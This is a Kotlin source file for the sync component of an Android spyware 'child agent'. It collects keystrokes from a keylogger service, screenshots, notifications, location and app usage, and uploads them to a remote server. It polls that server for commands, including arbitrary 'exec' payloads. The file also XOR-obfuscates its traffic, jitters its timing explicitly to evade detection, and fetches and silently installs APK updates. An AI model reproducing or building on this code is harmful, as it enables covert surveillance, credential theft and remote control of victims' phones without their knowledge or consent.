package com.divine.specter.child.sync

import android.content.Context
import android.os.BatteryManager
import android.os.Build
import android.os.PowerManager
import com.divine.specter.child.crypto.XorCrypto
import com.divine.specter.child.service.KeyloggerService
import com.divine.specter.child.service.ScreenCaptureService
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.serialization.Serializable
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import kotlin.random.Random

/**
 * Child agent sync - connects to parent server.
 * Runs in background, polls for commands, reports data.
 */
class ChildSync(private val context: Context) {

    companion object {
        private const val BASE_POLL_INTERVAL = 30_000L  // 30 seconds base
        private const val BASE_SYNC_INTERVAL = 60_000L  // 1 minute base
        private const val MAX_RETRIES = 3
        private const val RETRY_DELAY = 5_000L    // 5 seconds
        private const val CONNECTION_TIMEOUT = 10_000  // 10 seconds
        private const val READ_TIMEOUT = 15_000        // 15 seconds
        private const val JITTER_PERCENT = 0.2    // ±20% jitter
    }

    // Adaptive polling intervals
    private var currentPollInterval = BASE_POLL_INTERVAL
    private var currentSyncInterval = BASE_SYNC_INTERVAL
    private val random = Random.Default

    // XOR encryption key (derived from device ID)
    private var encryptionKey: ByteArray? = null

    private val json = Json { ignoreUnknownKeys = true; encodeDefaults = true }
    private var pollJob: Job? = null
    private var syncJob: Job? = null

    // Config - baked in at APK generation or set manually
    var serverUrl: String = ""
    var deviceId: String = ""
    var deviceToken: String = ""

    private val _isConnected = MutableStateFlow(false)
    val isConnected: StateFlow<Boolean> = _isConnected

    // Callbacks for command execution
    var onLocate: (() -> Unit)? = null
    var onLock: (() -> Unit)? = null
    var onBlockApp: ((String) -> Unit)? = null
    var onUnblockApp: ((String) -> Unit)? = null
    var onExec: ((String) -> String)? = null

    // Data providers
    var getLocation: (() -> LocationData?)? = null
    var getNotifications: (() -> List<NotificationData>)? = null
    var getCurrentApp: (() -> String?)? = null

    @Serializable
    data class LocationData(val latitude: Double, val longitude: Double, val accuracy: Float)

    @Serializable
    data class NotificationData(
        val packageName: String, val appName: String,
        val title: String?, val text: String?, val timestamp: Long
    )

    @Serializable
    data class Keystroke(
        val text: String,
        val packageName: String,
        val timestamp: Long,
        val fieldType: String = "unknown"
    )

    @Serializable
    data class Screenshot(
        val timestamp: Long,
        val imageDataBase64: String,
        val width: Int,
        val height: Int
    )

    @Serializable
    data class SyncRequest(
        val location: LocationData? = null,
        val battery: Int? = null,
        val current_app: String? = null,
        val screen_on: Boolean? = null,
        val notifications: List<NotificationData>? = null,
        val keystrokes: List<Keystroke>? = null,
        val screenshots: List<Screenshot>? = null
    )

    @Serializable
    data class Command(val id: String, val action: String, val payload: String = "")

    @Serializable
    data class PollResponse(val commands: List<Command>, val server_time: String)

    @Serializable
    data class RegisterResponse(val device_id: String, val token: String, val server_time: String)

    // ============== Setup ==============

    suspend fun register(serverUrl: String, deviceName: String): Boolean {
        this.serverUrl = serverUrl
        this.deviceId = Build.SERIAL.take(16).ifEmpty { "device_${System.currentTimeMillis()}" }

        // Generate encryption key from device ID
        encryptionKey = XorCrypto.sha256(deviceId)

        val body = json.encodeToString(mapOf(
            "device_id" to deviceId,
            "name" to deviceName,
            "model" to "${Build.MANUFACTURER} ${Build.MODEL}"
        ))

        return try {
            val response = post("$serverUrl/api/register", body)
            val reg = json.decodeFromString<RegisterResponse>(response)
            deviceToken = reg.token
            _isConnected.value = true
            true
        } catch (e: Exception) {
            _isConnected.value = false
            false
        }
    }

    // ============== Sync & Poll ==============

    fun startAll() {
        startSync()
        startPolling()
    }

    fun stopAll() {
        syncJob?.cancel()
        pollJob?.cancel()
    }

    private fun startSync() {
        syncJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                syncNow()
                val nextInterval = calculateAdaptiveInterval(currentSyncInterval)
                delay(nextInterval)
            }
        }
    }

    private fun startPolling() {
        pollJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive) {
                pollCommands()
                adjustPollRate()  // Adapt based on battery/charging
                val nextInterval = calculateAdaptiveInterval(currentPollInterval)
                delay(nextInterval)
            }
        }
    }

    /**
     * Calculate next interval with jitter to avoid detection patterns.
     * Adds ±20% randomness to base interval.
     */
    private fun calculateAdaptiveInterval(baseInterval: Long): Long {
        val jitter = (baseInterval * JITTER_PERCENT * random.nextDouble()).toLong()
        return baseInterval + (if (random.nextBoolean()) jitter else -jitter)
    }

    /**
     * Adjust polling rate based on battery level and charging state.
     * Fast when charging, slow when low battery, normal otherwise.
     */
    private fun adjustPollRate() {
        val batteryLevel = getBattery()
        val isCharging = isCharging()

        currentPollInterval = when {
            isCharging -> 15_000L              // Fast: 15s when charging
            batteryLevel < 15 -> 300_000L      // Slow: 5min when low battery
            batteryLevel < 30 -> 120_000L      // Medium: 2min when medium battery
            else -> BASE_POLL_INTERVAL         // Normal: 30s
        }
    }

    private fun isCharging(): Boolean {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.isCharging
    }

    suspend fun syncNow() {
        if (serverUrl.isEmpty()) return

        // Collect keystrokes
        val keystrokes = KeyloggerService.getAndClearKeystrokes().map { ks ->
            Keystroke(
                text = ks.text,
                packageName = ks.packageName,
                timestamp = ks.timestamp,
                fieldType = ks.fieldType
            )
        }

        // Collect screenshots
        val screenshots = ScreenCaptureService.getAndClearScreenshots().map { ss ->
            Screenshot(
                timestamp = ss.timestamp,
                imageDataBase64 = android.util.Base64.encodeToString(ss.imageData, android.util.Base64.NO_WRAP),
                width = ss.width,
                height = ss.height
            )
        }

        val request = SyncRequest(
            location = getLocation?.invoke(),
            battery = getBattery(),
            current_app = getCurrentApp?.invoke(),
            screen_on = isScreenOn(),
            notifications = getNotifications?.invoke(),
            keystrokes = if (keystrokes.isNotEmpty()) keystrokes else null,
            screenshots = if (screenshots.isNotEmpty()) screenshots else null
        )

        try {
            postWithAuth("$serverUrl/api/sync", json.encodeToString(request))
            _isConnected.value = true
        } catch (e: Exception) {
            _isConnected.value = false
        }
    }

    suspend fun pollCommands() {
        if (serverUrl.isEmpty()) return

        try {
            val response = getWithAuth("$serverUrl/api/poll")
            val poll = json.decodeFromString<PollResponse>(response)
            _isConnected.value = true

            for (cmd in poll.commands) {
                executeCommand(cmd)
            }
        } catch (e: Exception) {
            _isConnected.value = false
        }
    }

    private suspend fun executeCommand(cmd: Command) {
        val result = try {
            when (cmd.action) {
                "locate" -> { onLocate?.invoke(); "Location requested" }
                "lock" -> { onLock?.invoke(); "Locked" }
                "block_app" -> { onBlockApp?.invoke(cmd.payload); "Blocked ${cmd.payload}" }
                "unblock_app" -> { onUnblockApp?.invoke(cmd.payload); "Unblocked ${cmd.payload}" }
                "exec" -> onExec?.invoke(cmd.payload) ?: "No executor"
                else -> "Unknown: ${cmd.action}"
            }
        } catch (e: Exception) {
            "Error: ${e.message}"
        }

        // Report result
        try {
            postWithAuth("$serverUrl/api/result", json.encodeToString(mapOf(
                "command_id" to cmd.id,
                "success" to !result.startsWith("Error"),
                "output" to result
            )))
        } catch (_: Exception) { }
    }

    // ============== Helpers ==============

    private fun getBattery(): Int {
        val bm = context.getSystemService(Context.BATTERY_SERVICE) as BatteryManager
        return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
    }

    private fun isScreenOn(): Boolean {
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isInteractive
    }

    private var consecutiveFailures = 0

    private suspend fun <T> withRetry(
        maxRetries: Int = MAX_RETRIES,
        block: suspend () -> T
    ): T {
        var lastException: Exception? = null
        repeat(maxRetries) { attempt ->
            try {
                val result = block()
                consecutiveFailures = 0
                return result
            } catch (e: Exception) {
                lastException = e
                if (attempt < maxRetries - 1) {
                    delay(RETRY_DELAY * (attempt + 1))  // Exponential backoff
                }
            }
        }
        consecutiveFailures++
        throw lastException ?: Exception("Unknown error after $maxRetries retries")
    }

    private suspend fun post(url: String, body: String): String = withContext(Dispatchers.IO) {
        withRetry {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = CONNECTION_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.doOutput = true
            try {
                // XOR encrypt payload
                val encrypted = encryptionKey?.let {
                    XorCrypto.encrypt(body.toByteArray(), it)
                } ?: body.toByteArray()

                conn.outputStream.use { it.write(encrypted) }
                val response = BufferedReader(InputStreamReader(conn.inputStream)).use { it.readText() }

                // XOR decrypt response
                encryptionKey?.let {
                    XorCrypto.decryptString(response.toByteArray(), it)
                } ?: response
            } finally {
                conn.disconnect()
            }
        }
    }

    private suspend fun postWithAuth(url: String, body: String): String = withContext(Dispatchers.IO) {
        withRetry {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = CONNECTION_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.requestMethod = "POST"
            conn.setRequestProperty("Content-Type", "application/octet-stream")
            conn.setRequestProperty("X-Device-ID", deviceId)
            conn.setRequestProperty("X-Device-Token", deviceToken)
            conn.doOutput = true
            try {
                // XOR encrypt payload
                val encrypted = encryptionKey?.let {
                    XorCrypto.encrypt(body.toByteArray(), it)
                } ?: body.toByteArray()

                conn.outputStream.use { it.write(encrypted) }
                val response = conn.inputStream.readBytes()

                // XOR decrypt response
                val decrypted = encryptionKey?.let {
                    XorCrypto.decrypt(response, it)
                } ?: response

                String(decrypted)
            } finally {
                conn.disconnect()
            }
        }
    }

    private suspend fun getWithAuth(url: String): String = withContext(Dispatchers.IO) {
        withRetry {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.connectTimeout = CONNECTION_TIMEOUT
            conn.readTimeout = READ_TIMEOUT
            conn.setRequestProperty("X-Device-ID", deviceId)
            conn.setRequestProperty("X-Device-Token", deviceToken)
            try {
                val response = conn.inputStream.readBytes()

                // XOR decrypt response
                val decrypted = encryptionKey?.let {
                    XorCrypto.decrypt(response, it)
                } ?: response

                String(decrypted)
            } finally {
                conn.disconnect()
            }
        }
    }

    fun getConsecutiveFailures(): Int = consecutiveFailures

    /**
     * BINARY UPDATE: Check for and install APK updates from parent server
     */
    suspend fun checkForUpdates(currentVersion: Int): Boolean = withContext(Dispatchers.IO) {
        if (serverUrl.isEmpty()) return@withContext false

        try {
            val requestBody = json.encodeToString(mapOf("current_version" to currentVersion))
            val response = postWithAuth("$serverUrl/api/update", requestBody)

            val updateData = json.decodeFromString<Map<String, String>>(response)
            val apkDataBase64 = updateData["apk_data"] ?: return@withContext false
            val newVersion = updateData["version"]?.toIntOrNull() ?: return@withContext false

            // Decode and decrypt APK
            val encryptedApk = android.util.Base64.decode(apkDataBase64, android.util.Base64.NO_WRAP)
            val decryptedApk = encryptionKey?.let {
                XorCrypto.decrypt(encryptedApk, it)
            } ?: encryptedApk

            // Save to cache and install
            val apkFile = File(context.cacheDir, "update_v$newVersion.apk")
            apkFile.writeBytes(decryptedApk)

            installApk(apkFile)
            true
        } catch (e: Exception) {
            android.util.Log.e("ChildSync", "Update check failed: ${e.message}")
            false
        }
    }

    private fun installApk(apkFile: File) {
        try {
            val packageInstaller = context.packageManager.packageInstaller
            val params = android.content.pm.PackageInstaller.SessionParams(
                android.content.pm.PackageInstaller.SessionParams.MODE_FULL_INSTALL
            )

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            session.openWrite("package", 0, -1).use { output: java.io.OutputStream ->
                apkFile.inputStream().use { input ->
                    input.copyTo(output)
                }
            }

            val intent = android.content.Intent(context, context.javaClass).apply {
                action = "com.divine.specter.child.INSTALL_COMPLETE"
            }
            val pendingIntent = android.app.PendingIntent.getBroadcast(
                context, 0, intent,
                android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE
            )

            session.commit(pendingIntent.intentSender)
            session.close()
        } catch (e: Exception) {
            android.util.Log.e("ChildSync", "APK install failed: ${e.message}")
        }
    }
}
